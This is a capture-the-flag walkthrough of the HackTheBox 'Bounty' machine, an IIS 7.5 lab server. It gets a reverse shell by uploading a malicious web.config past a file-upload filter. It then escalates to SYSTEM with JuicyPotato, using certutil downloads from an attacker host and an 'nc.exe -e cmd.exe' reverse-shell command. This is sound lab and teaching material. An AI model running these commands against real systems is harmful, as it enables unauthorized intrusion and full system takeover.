Bounty [HTB](https://app.hackthebox.com/machines/Bounty)
![bounty-01](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Bounty/img/bounty-01.png)

## Recon 

After adding the target to `/etc/hosts`, i run an `nmap` scan:

```bash
nmap -sC -sV -A -p- bounty.htb -oN nmap.result
```

![nmap-res-02](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Bounty/img/nmap-res-02.png)

We have the following:

+ An IIS v7.5 on port 80.

We have a single web server, lets see what we can find. 


### IIS Port 80

Lets start by navigating towards the site at `http://bounty.htb` 

![site-03](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Bounty/img/site-03.png)

Not much to see here, lets try a directory and file scan using `ffuf`:

```bash
ffuf -w /usr/share/wordlists/seclists/SecLists-master/Discovery/Web-Content/directory-list-2.3-medium
.txt -u http://bounty.htb/FUZZ -e .cgi,.php,.aspx,.asp
```

![ffuf-04](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Bounty/img/ffuf-04.png)

![ffuf-05](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Bounty/img/ffuf-05.png)

We have two interesting results. The first is a file upload directory, if we use Burp to intercept the 
request to this link we will get a `403` forbbiden return code:

![forbidden-06](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Bounty/img/forbidden-06.png)

On the other hand, we have a file upload page enabled for public use on this server:

![upload-07](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Bounty/img/upload-07.png)

Lets try to upload a simple `.txt` file to the server:

![txt-08](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Bounty/img/txt-08.png)

We get an error. Lets examine the replay in `Burp`:

![burp-09](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Bounty/img/burp-09.png)

There is a server side `ValidateFile()` funciton. I couldnt find this functiuon executing on the client 
side. We cant be sure exactly how the function works, it could determine acceptable file types via HTTP 
headers, magic numbers, file extensions, etc. 

Lets try to upload a `jpg` image:

![jpg-10](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Bounty/img/jpg-10.png)

So we see that `jpg` files are accepted. Can we view the image from the `uploadedfiles` directory? 

![view-11](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Bounty/img/view-11.png)

Yes we can. Ok, so now ideally what we want to do is find a way to land a reverse shell. With an IIS 
server we can try a copule of things. We can try to upload an `.aspx` reverse shell, which doesnt work 
in this case. The file upload validator checks the file extension. I've tried different tricks to 
bypass this but nothing worked for me. 

But we can also inject a code inside a `web.config` file, which in this case, is accepted:

![config-12](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Bounty/img/config-12.png)


If we open the file via the browser we get an internal error:

![internal-err-13](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Bounty/img/internal-err-13.png)

This happens becasue the server tried to render the file, but failed because there was no valid syntax, lets change that. 

I found a `web.config` file for a reverse shell on [Github](https://github.com/d4t4s3c/Offensive-Reverse-Shell-Cheat-Sheet/blob/master/web.config).

![rshell-14](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Bounty/img/rhsell-14.png)

As you can see, it runs a PowerShell command to grab a reverse shell from our host and execute it.
First, download the `web.config` file and update you attack machine's IP. 

Next, grab a copy of [nishang](https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellTcp.ps1)'s `Invoke-PowerShellTCP.ps1` script to your working directory and invoke the reverse shell cmdlet at the buttom:

![cmdlet-15](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Bounty/img/cmdlet-15.png)

Now we need to host this file via a python web server:

```bash
python3 -m http.server 80
```

Upload the `web.config` file to the server:

![upload-16](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Bounty/img/upload-16.png)

Start the listener:

```bash
rlwrap nc -lnvp 443
```

Execute the  `web.config` file via the URL at `http://bounty.htb/uploadedfiles/web.config`.

This should give you access to the target system:

![shell-17](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Bounty/img/shell-17.png)


## Privilege Escalation

If we check for our user's privileges with:

```cmd
whoami /priv
```

![privs-18](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Bounty/img/privs-18.png)

We can see we have the `Impersonate` privileged enabled. We can potentially exploit this with a [potato attack](https://github.com/ohpe/juicy-potato), downlaod from [here](https://github.com/ohpe/juicy-potato/releases).


Once you have the `JuicyPotato.exe` binary in your working directory, grab a copy of `/usr/share/windows-resources/binaries/nc.exe` as well. Then start a Python server with:

```bash
python3 -m http.server 80
```

Now from the traget, `cd` into a directory we can write to like `C:\Users\merlin\AppData\Local\Temp` and download both files with:

```cmd
certutil -urlcache -f http://10.10.14.62/JuicyPotato.exe jp.exe
certutil -urlcache -f http://10.10.14.62/nc.exe nc.exe
```

Start the listener with:

```bash
rlwrap nc -lnvp 9001
```


Execute the exploit with:

```cmd
C:\Users\merlin\AppData\Local\Temp\jp.exe -l 9001 -p C:\windows\system32\cmd.exe -a "/c C:\Users\merlin\AppData\Local\Temp\nc.exe -e cmd.exe 10.10.14.62 9001" -t *
```

This should yield you shell access as the system:

![root-19](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Bounty/img/root-19.png)
